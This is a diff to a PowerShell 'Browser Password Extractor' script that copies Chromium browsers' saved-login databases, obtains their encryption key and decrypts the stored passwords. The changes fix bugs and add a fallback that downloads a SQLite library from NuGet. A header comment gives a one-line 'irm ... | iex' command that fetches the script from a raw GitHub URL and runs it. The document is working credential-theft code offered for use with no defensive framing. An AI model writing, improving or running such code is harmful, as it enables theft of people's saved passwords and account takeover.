@@ -1,5 +1,5 @@
-# Browser Password Extractor - Complete PowerShell Version
-# Usage: irm https://raw.githubusercontent.com/kalivarun/Script-Tools-/refs/heads/main/powershell-extract.txt | iex
+# Browser Password Extractor - Fixed PowerShell Version
+# Usage: irm https://raw.githubusercontent.com/kalivarun/Script-Tools-/refs/heads/main/extract.txt | iex
 
 function Get-BrowserPasswords {
     [CmdletBinding()]
@@ -224,14 +224,16 @@ function Get-ChromiumPasswords {
         Write-Host "   ✅ Got encryption key for $BrowserName" -ForegroundColor Green
         
     } catch {
-        Write-Host "   ❌ Error getting encryption key for $BrowserName: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "   ❌ Error getting encryption key for ${BrowserName}: $($_.Exception.Message)" -ForegroundColor Red
         return $passwords
     }
     
     # Process profiles
     $profiles = @("Default")
     $profileDirs = Get-ChildItem "$BrowserPath\Profile *" -Directory -ErrorAction SilentlyContinue
-    $profiles += $profileDirs | Select-Object -ExpandProperty Name
+    if ($profileDirs) {
+        $profiles += $profileDirs | Select-Object -ExpandProperty Name
+    }
     
     foreach ($profile in $profiles) {
         $profilePath = "$BrowserPath\$profile"
@@ -242,7 +244,7 @@ function Get-ChromiumPasswords {
                 Write-Host "   📁 Processing profile: $profile" -ForegroundColor Gray
                 
                 # Copy database to avoid locks
-                $tempDb = "$env:TEMP\$BrowserName`_$profile`_temp.db"
+                $tempDb = "$env:TEMP\${BrowserName}_${profile}_temp.db"
                 Copy-Item $loginDataPath $tempDb -Force
                 
                 # Use .NET to read SQLite database
@@ -284,12 +286,12 @@ function Get-ChromiumPasswords {
                 Write-Host "      ✅ Found $($passwords.Count) passwords in $profile" -ForegroundColor Green
                 
             } catch {
-                Write-Host "      ❌ Error processing $BrowserName profile $profile : $($_.Exception.Message)" -ForegroundColor Red
+                Write-Host "      ❌ Error processing ${BrowserName} profile ${profile}: $($_.Exception.Message)" -ForegroundColor Red
             }
         }
     }
     
-    Write-Host "   ✅ $BrowserName: $($passwords.Count) total passwords" -ForegroundColor Green
+    Write-Host "   ✅ ${BrowserName}: $($passwords.Count) total passwords" -ForegroundColor Green
     return $passwords
 }
 
@@ -331,23 +333,28 @@ function Decrypt-Password {
 try {
     # Try to load SQLite from GAC or current directory
     Add-Type -AssemblyName "System.Data.SQLite" -ErrorAction Stop
+    Write-Host "✅ System.Data.SQLite loaded successfully" -ForegroundColor Green
 } catch {
+    Write-Host "⚠️  System.Data.SQLite not available. Trying alternative methods..." -ForegroundColor Yellow
+    
+    # Try to download and load SQLite
     try {
-        # If not in GAC, try to load from common locations
-        $sqlitePaths = @(
-            "$env:ProgramFiles\System.Data.SQLite\2015\bin\System.Data.SQLite.dll",
-            "$env:ProgramFiles (x86)\System.Data.SQLite\2015\bin\System.Data.SQLite.dll",
-            ".\System.Data.SQLite.dll"
-        )
+        $sqliteUrl = "https://www.nuget.org/api/v2/package/System.Data.SQLite/1.0.118"
+        $tempDir = "$env:TEMP\sqlite_temp"
+        New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
         
-        foreach ($path in $sqlitePaths) {
-            if (Test-Path $path) {
-                Add-Type -Path $path
-                break
-            }
+        Invoke-WebRequest -Uri $sqliteUrl -OutFile "$tempDir\sqlite.zip"
+        Expand-Archive -Path "$tempDir\sqlite.zip" -DestinationPath $tempDir -Force
+        
+        $dllPath = Get-ChildItem -Path $tempDir -Recurse -Filter "System.Data.SQLite.dll" | Select-Object -First 1
+        if ($dllPath) {
+            Add-Type -Path $dllPath.FullName
+            Write-Host "✅ System.Data.SQLite loaded from download" -ForegroundColor Green
         }
     } catch {
-        Write-Host "⚠️  System.Data.SQLite not available. Using alternative method..." -ForegroundColor Yellow
+        Write-Host "❌ Could not load System.Data.SQLite. Password extraction will not work." -ForegroundColor Red
+        Write-Host "💡 Install SQLite from: https://system.data.sqlite.org/index.html/doc/trunk/www/downloads.wiki" -ForegroundColor Yellow
+        return
     }
 }
 
@@ -360,7 +367,6 @@ try {
     Get-BrowserPasswords
 } catch {
     Write-Host "❌ Critical error: $($_.Exception.Message)" -ForegroundColor Red
-    Write-Host "Stack trace: $($_.ScriptStackTrace)" -ForegroundColor Red
 }
 
 Write-Host ""
